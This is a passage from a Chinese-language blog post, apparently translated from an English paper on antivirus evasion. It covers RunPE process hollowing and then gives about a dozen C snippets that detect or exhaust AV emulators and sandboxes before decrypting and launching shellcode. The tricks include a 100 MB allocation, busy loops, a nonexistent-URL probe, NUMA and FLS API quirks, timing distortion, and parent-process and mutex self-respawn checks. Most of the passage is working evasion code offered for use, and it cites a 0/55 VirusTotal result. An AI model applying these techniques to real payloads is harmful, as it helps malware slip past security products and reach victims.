<a href="https://blog.sevagas.com/?PE-injection-explained">https://blog.sevagas.com/?PE-injection-explained</a></p><p>虽然代码注入是一个恶意软件隐形的好办法，大量其中的代码也是可能通过启发式分析识别的</p><p>这就是为什么代码注入一般不用于绕过AV，而是使用后用来隐藏和获取特权（例如注入进浏览器的代码和浏览器一样有相同的访问防火墙的权限。</p><h2 id="RunPE方法"><a href="#RunPE方法" class="headerlink" title="RunPE方法"></a>RunPE方法</h2><p>这个方法是通过替换掉进程空间的代码从而在目标进程中运行我们想要运行的代码，和代码注入不同的是，在代码注入中你是在远程进程开辟的空间中执行代码；但是在RunPE这个技术中，你使用你想要执行的代码替换掉了远程进程的代码。</p><p>一个小例子：</p><p>恶意代码被加壳或者加密了，被插入到一个专门加载它的二进制代码中。当加载器执行，它将执行：</p><ul><li>使用CreateProcess打开一个合法的系统进程（例如：cmd.exe或者calc.exe）。</li><li>取消映射（Unmap）进程（使用NtUnmapViewOfSection）</li><li>使用恶意代码替换掉这个进程（使用WriteProcessMemory）</li></ul><p>当进程被DEP(数据执行保护)保护的时候，替换一个进程的内存不是很有可能的。</p><p>正如代码注入的方法一样，但是因为这篇文章的主题不是这方面的，所以没有给充分的代码。</p><h1 id="简单有效的方法"><a href="#简单有效的方法" class="headerlink" title="简单有效的方法"></a>简单有效的方法</h1><h2 id="Offer-you-have-to-refuse-方法"><a href="#Offer-you-have-to-refuse-方法" class="headerlink" title="Offer you have to refuse 方法"></a>Offer you have to refuse 方法</h2><p>AV扫描器主要的限制是需要在每个文件上花费大量的时间。在一个常规的系统扫描中，AV必须要分析成百上千的文件。它不能够花费过多的时间和力量在个别的文件上（这就可以在AV上导致一个拒绝服务攻击）。最简单绕过AV的方法是仅仅在代码解密之前，消耗掉AV足够的时间。一个简单的Sleep不能够实现这个技巧，AV模拟器已经适应了这个。无论如何有大量的方法可以实现取得时间。这个被叫做“Offer you have to refuse ”，因为它强行让AV去检查一些代码，这个会消耗掉AV大量的资源，因此我们确信在解密代码被执行之前AV会放弃这个检查。</p><h3 id="例子1：分配填充100M内存"><a href="#例子1：分配填充100M内存" class="headerlink" title="例子1：分配填充100M内存"></a>例子1：分配填充100M内存</h3><p>在下面的代码中，大部分的AV会在malloc的过程中仅仅停止，关于分配指针的条件验证甚至没有必要。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TOO_MUCH_MEM 100000000</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *memdmp = <span class="literal">NULL</span>;</span><br><span class="line">    memdmp = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(TOO_MUCH_MEM);</span><br><span class="line">    <span class="keyword">if</span> (memdmp != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">memset</span>(memdmp, <span class="number">00</span>, TOO_MUCH_MEM);</span><br><span class="line">        <span class="built_in">free</span>(memdmp);</span><br><span class="line">        decryptCodeSection();</span><br><span class="line">        startShellCode();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当时的VT：0&#x2F;55</p><h3 id="例子2：成百上千的递增"><a href="#例子2：成百上千的递增" class="headerlink" title="例子2：成百上千的递增"></a>例子2：成百上千的递增</h3><p>使用for循环去每次递增1，达到100万次。这个足以绕过杀软，而且对于现代CPU是可行的。一个人在运行这段代码不会检测到任何的异常。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_OP 100000000</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> cpt = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MAX_OP; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        cpt++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (cpt == MAX_OP)</span><br><span class="line">    &#123;</span><br><span class="line">        decryptCodeSection();</span><br><span class="line">        startShellCode();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="The-“I-shouldn’t-be-able-to-do-that-”-method"><a href="#The-“I-shouldn’t-be-able-to-do-that-”-method" class="headerlink" title="The “I shouldn’t be able to do that!” method"></a>The “I shouldn’t be able to do that!” method</h2><p>由于在一个仿真的系统里被推出，或许会有一些错误发生，代码或许在正常权限下不会运行。一般来说，在所有权限下，代码都将运行。这个能够被用来猜出这个代码是否在被分析。</p><h3 id="例子1：打开系统进程"><a href="#例子1：打开系统进程" class="headerlink" title="例子1：打开系统进程"></a>例子1：打开系统进程</h3><p>代码会尝试打开一般是拥有所有权限的4号系统进程。如果这个代码没有运行在系统MIC和ring0下，这个将会失败（OpenProcess会返回 00 ）。在这个VirusTotal中，你会看到这个不是FUD方法，而是绕过一些对这个特殊问题脆弱的杀软。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HANDLE file;</span><br><span class="line">    HANDLE proc;</span><br><span class="line">    proc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, <span class="number">4</span>);</span><br><span class="line">    <span class="keyword">if</span> (proc == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        decryptCodeSection();</span><br><span class="line">        startShellCode();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="尝试打开一个不存在的URL"><a href="#尝试打开一个不存在的URL" class="headerlink" title="尝试打开一个不存在的URL"></a>尝试打开一个不存在的URL</h3><p>一种通常用来让代码自我意识到沙箱的方法是在互联网上下载一个特定的文件，并将其哈希与代码知道的哈希进行比较。</p><p>为什么这个有效呢？这是因为沙箱环境不给潜在的恶意代码访问互联网的权限。当一个被沙箱分析的文件访问互联网，沙箱只会发送其自身成的文件。因此代码可以通过比较这个文件和其所期望的文件进来判断是否处于沙箱之中。</p><p>这个方法有一点问题，首先，如果你没有互联网的访问权限这个就没有效。其次，如果<a href="https://www.77169.net/downloads">下载</a>的文件改变或者被移除了，代码也不会有效。</p><p>另一个没有这些问题的方法是做这个相反的！尝试访问不存在的web域。在真实的世界里，这个会失败。在AV中，因为AV会使用其模拟的页面，这个方法是有效的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Wininet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib, <span class="meta-string">&quot;Wininet.lib&quot;</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> cononstart[] = <span class="string">&quot;http://www.notdetectedmaliciouscode.com//&quot;</span>; <span class="comment">// Invalid URL</span></span><br><span class="line">    <span class="keyword">char</span> readbuf[<span class="number">1024</span>];</span><br><span class="line">    HINTERNET httpopen, openurl;</span><br><span class="line">    DWORD read;</span><br><span class="line">    httpopen = InternetOpen(<span class="literal">NULL</span>, INTERNET_OPEN_TYPE_DIRECT, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">    openurl = InternetOpenUrl(httpopen, cononstart, <span class="literal">NULL</span>, <span class="literal">NULL</span>, INTERNET_FLAG_RELOAD | INTERNET _FLAG_NO_CACHE_WRITE, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (!openurl) <span class="comment">// Access failed, we are not in AV</span></span><br><span class="line">    &#123;</span><br><span class="line">        InternetCloseHandle(httpopen);</span><br><span class="line">        InternetCloseHandle(openurl);</span><br><span class="line">        decryptCodeSection();</span><br><span class="line">        startShellCode();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="comment">// Access successful, we are in AV and redirected to a custom webpage</span></span><br><span class="line">    &#123;</span><br><span class="line">        InternetCloseHandle(httpopen);</span><br><span class="line">        InternetCloseHandle(openurl);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="The-“Knowing-your-enemy”-method"><a href="#The-“Knowing-your-enemy”-method" class="headerlink" title="The “Knowing your enemy” method"></a>The “Knowing your enemy” method</h2><p>如果某些人知道了一些目标机器上的一些信息，绕过杀软会变得相当的容易。把代码解密机制链接到你知道目标计算机上的一些信息（或者工作组）。</p><h3 id="例子1：依赖于本地用户名的操作"><a href="#例子1：依赖于本地用户名的操作" class="headerlink" title="例子1：依赖于本地用户名的操作"></a>例子1：依赖于本地用户名的操作</h3><p>如果系统上某人的用户名已知，则可以根据该用户名请求操作。例如，我们可以尝试在用户帐户文件中写入和读取这些文件。在下面的代码中，我们在用户桌面上创建一个文件，我们在其中编写一些字符，然后只有打开文件并读取字符，我们才能启动解密方案。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FILE_PATH <span class="meta-string">&quot;C:\\Users\\bob\\Desktop\\tmp.file&quot;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HANDLE file;</span><br><span class="line">    DWORD tmp;</span><br><span class="line">    LPCVOID buff = <span class="string">&quot;1234&quot;</span>;</span><br><span class="line">    <span class="keyword">char</span> outputbuff[<span class="number">5</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    file = CreateFile(FILE_PATH, GENERIC_WRITE, <span class="number">0</span>, <span class="literal">NULL</span>, CREATE_ALWAYS,</span><br><span class="line">                      FILE_ATTRIBUTE_NORMAL, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (WriteFile(file, buff, <span class="built_in">strlen</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)buff), &amp;tmp, <span class="literal">NULL</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        CloseHandle(file);</span><br><span class="line">        file = CreateFile(FILE_PATH,</span><br><span class="line">                          GENERIC_READ,</span><br><span class="line">                          FILE_SHARE_READ,</span><br><span class="line">                          <span class="literal">NULL</span>,</span><br><span class="line">                          OPEN_EXISTING, <span class="comment">// existing file only</span></span><br><span class="line">                          FILE_ATTRIBUTE_NORMAL,</span><br><span class="line">                          <span class="literal">NULL</span>);</span><br><span class="line">        <span class="keyword">if</span> (ReadFile(file, outputbuff, <span class="number">4</span>, &amp;tmp, <span class="literal">NULL</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">strncmp</span>(buff, outputbuff, <span class="number">4</span>) == <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                decryptCodeSection();</span><br><span class="line">                startShellCode();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        CloseHandle(file);</span><br><span class="line">    &#125;</span><br><span class="line">    DeleteFile(FILE_PATH);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="The-“WTF-is-that-”-method"><a href="#The-“WTF-is-that-”-method" class="headerlink" title="The “WTF is that?” method"></a>The “WTF is that?” method</h2><p>这节是关于win api的东西</p><h3 id="例子1：What-the-fuck-is-NUMA"><a href="#例子1：What-the-fuck-is-NUMA" class="headerlink" title="例子1：What the fuck is NUMA?"></a>例子1：What the fuck is NUMA?</h3><p>NUMA代表Non Uniform Memory Access（非一致内存访问）。它是一个在多系统中配置内存管理的方法。它链接到在 Kernel32.dll 中声明的一整套函数</p><p>更多信息：<a href="https://docs.microsoft.com/zh-cn/windows/win32/procthread/numa-support?redirectedfrom=MSDN">https://docs.microsoft.com/zh-cn/windows/win32/procthread/numa-support?redirectedfrom=MSDN</a></p><p>下面的代码在物理环境中有效，av环境中失效</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    LPVOID mem = <span class="literal">NULL</span>;</span><br><span class="line">    mem = VirtualAllocExNuma(GetCurrentProcess(), <span class="literal">NULL</span>, <span class="number">1000</span>, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (mem != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        decryptCodeSection();</span><br><span class="line">        startShellCode();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="例子2：What-the-fuck-are-FLS"><a href="#例子2：What-the-fuck-are-FLS" class="headerlink" title="例子2：What the fuck are FLS?"></a>例子2：What the fuck are FLS?</h3><p>FLS是Fiber Local Storage(纤程本地存储），被用来操纵与纤程相关的数据。纤程是一整套运行在线程里的可执行组件。参考这里：<a href="https://docs.microsoft.com/zh-cn/windows/win32/procthread/fibers?redirectedfrom=MSDN">https://docs.microsoft.com/zh-cn/windows/win32/procthread/fibers?redirectedfrom=MSDN</a></p><p>在一些av环境中，对于FlsAlloc函数总是返回FLS_OUT_OF_INDEXES</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    DWORD result = FlsAlloc(<span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (result != FLS_OUT_OF_INDEXES)</span><br><span class="line">    &#123;</span><br><span class="line">        decryptCodeSection();</span><br><span class="line">        startShellCode();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="The-“Checking-the-environment”-method"><a href="#The-“Checking-the-environment”-method" class="headerlink" title="The “Checking the environment” method"></a>The “Checking the environment” method</h2><p>如果AV依赖于一个沙盒&#x2F;仿真环境，一般其环境与真实的环境是不一样的。有大量的方法做这种检查。下面描述了其中两种方法：</p><h3 id="例子1：检查进程内存"><a href="#例子1：检查进程内存" class="headerlink" title="例子1：检查进程内存"></a>例子1：检查进程内存</h3><p>使用Sysinternals工具，当一个AV扫描一个进程的时候，会改变它的内存。AV会为进程开辟内存，仿真的代码进程API也会返回与我们预期不同的值。在这种情况下，我在当前进程使用GetProcessMemoryInfo。如果当前工作设置大于3500000 bytes，我认为这个代码运行在一个AV环境中，如果不是，那么这个代码就解密并运行。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Psapi.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib, <span class="meta-string">&quot;Psapi.lib&quot;</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    PROCESS_MEMORY_COUNTERS pmc;</span><br><span class="line">    <span class="built_in">GetProcessMemoryInfo</span>(<span class="built_in">GetCurrentProcess</span>(), &amp;pmc, <span class="built_in"><span class="keyword">sizeof</span></span>(pmc));</span><br><span class="line">    <span class="keyword">if</span> (pmc.WorkingSetSize &lt;= <span class="number">3500000</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">decryptCodeSection</span>();</span><br><span class="line">        <span class="built_in">startShellCode</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="例子2：-Time-distortion"><a href="#例子2：-Time-distortion" class="headerlink" title="例子2： Time distortion"></a>例子2： Time distortion</h3><p>我们知道Sleep函数是被AV仿真了。做这个是为了阻止使用一个简单的Sleep调用就绕过扫描时间限制。这个问题是，是否在这个模拟的Sleep方式中存在缺陷？</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib, <span class="meta-string">&quot;winmm.lib&quot;</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    DWORD mesure1;</span><br><span class="line">    DWORD mesure2;</span><br><span class="line">    mesure1 = timeGetTime();</span><br><span class="line">    Sleep(<span class="number">1000</span>);</span><br><span class="line">    mesure2 = timeGetTime();</span><br><span class="line">    <span class="keyword">if</span> ((mesure2 &gt; (mesure1 + <span class="number">1000</span>)) &amp;&amp; (mesure2 &lt; (mesure1 + <span class="number">1005</span>)))</span><br><span class="line">    &#123;</span><br><span class="line">        decryptCodeSection();</span><br><span class="line">        startShellCode();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="例子3：What-is-my-name"><a href="#例子3：What-is-my-name" class="headerlink" title="例子3：What is my name?"></a>例子3：What is my name?</h3><p>直接看代码都能懂</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strstr</span>(argv[<span class="number">0</span>], <span class="string">&quot;test.exe&quot;</span>) &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        decryptCodeSection();</span><br><span class="line">        startShellCode();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="The-“I-call-myself”-method"><a href="#The-“I-call-myself”-method" class="headerlink" title="The “I call myself” method"></a>The “I call myself” method</h2><p>这是环境检查方法的一个变体。AV只有在以某种方式调用时才会触发代码</p><h3 id="例子1：I-am-my-own-father"><a href="#例子1：I-am-my-own-father" class="headerlink" title="例子1：I am my own father"></a>例子1：I am my own father</h3><p>在这个例子中，如果它的父进程也是test.exe的话，可执行文件（test.exe）才会进入解密的分支。当代码被安装，它会获取其父进程的ID，如果其父进程不是test.exe，它会调用test.exe然后停止。被调用的进程也有一个叫test.xee的父进程并且进入解密部分。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Psapi.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib, <span class="meta-string">&quot;Psapi.lib&quot;</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> pid = <span class="number">-1</span>;</span><br><span class="line">    HANDLE hProcess;</span><br><span class="line">    HANDLE h = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, <span class="number">0</span>);</span><br><span class="line">    PROCESSENTRY32 pe = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    pe.dwSize = <span class="keyword">sizeof</span>(PROCESSENTRY32);</span><br><span class="line">    <span class="comment">// Get current PID</span></span><br><span class="line">    pid = GetCurrentProcessId();</span><br><span class="line">    <span class="keyword">if</span> (Process32First(h, &amp;pe))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// find parent PID</span></span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (pe.th32ProcessID == pid)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// Now we have the parent ID, check the module name</span></span><br><span class="line">                <span class="comment">// Get a handle to the process.</span></span><br><span class="line">                hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE,</span><br><span class="line">                                       pe.th32ParentProcessID);</span><br><span class="line">                <span class="comment">// Get the process name.</span></span><br><span class="line">                <span class="keyword">if</span> (<span class="literal">NULL</span> != hProcess)</span><br><span class="line">                &#123;</span><br><span class="line">                    HMODULE hMod;</span><br><span class="line">                    DWORD cbNeeded;</span><br><span class="line">                    TCHAR processName[MAX_PATH];</span><br><span class="line">                    <span class="keyword">if</span> (EnumProcessModules(hProcess, &amp;hMod, <span class="keyword">sizeof</span>(hMod), &amp;cbNeeded))</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="comment">// If parent process is myself, decrypt the code</span></span><br><span class="line">                        GetModuleBaseName(hProcess, hMod, processName,</span><br><span class="line">                                          <span class="keyword">sizeof</span>(processName) / <span class="keyword">sizeof</span>(TCHAR));</span><br><span class="line">                        <span class="keyword">if</span> (<span class="built_in">strncmp</span>(processName, <span class="string">&quot;test.exe&quot;</span>, <span class="built_in">strlen</span>(processName)) == <span class="number">0</span>)</span><br><span class="line">                        &#123;</span><br><span class="line">                            decryptCodeSection();</span><br><span class="line">                            startShellCode();</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">else</span></span><br><span class="line">                        &#123;</span><br><span class="line">                            <span class="comment">// or else call my binary in a new process</span></span><br><span class="line">                            startExe(<span class="string">&quot;test.exe&quot;</span>);</span><br><span class="line">                            Sleep(<span class="number">100</span>); <span class="comment">// Wait for child</span></span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// Release the handle to the process.</span></span><br><span class="line">                CloseHandle(hProcess);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">while</span> (Process32Next(h, &amp;pe));</span><br><span class="line">    &#125;</span><br><span class="line">    CloseHandle(h);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="例子2：First-open-a-mutex"><a href="#例子2：First-open-a-mutex" class="headerlink" title="例子2：First open a mutex"></a>例子2：First open a mutex</h3><p>在这个例子中，只有当一个确定的互斥量对象已经存在于系统中，代码（test.exe)才会开始解密代码。这个技巧是这样，当这个对象不存在，代码会创建并调用其自己一个新的实例。在父进程结束之前，子进程会尝试创建一个互斥量，会进入这个ERROR_ALREADY_EXIST代码分支。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HANDLE mutex;</span><br><span class="line">    mutex = CreateMutex(<span class="literal">NULL</span>, TRUE, <span class="string">&quot;muuuu&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (GetLastError() == ERROR_ALREADY_EXISTS)</span><br><span class="line">    &#123;</span><br><span class="line">        decryptCodeSection();</span><br><span class="line">        startShellCode();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        startExe(<span class="string">&quot;test.exe&quot;</span>);</span><br><span class="line">        Sleep(<span class="number">100</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="结论"><a href="#结论" class="headerlink" 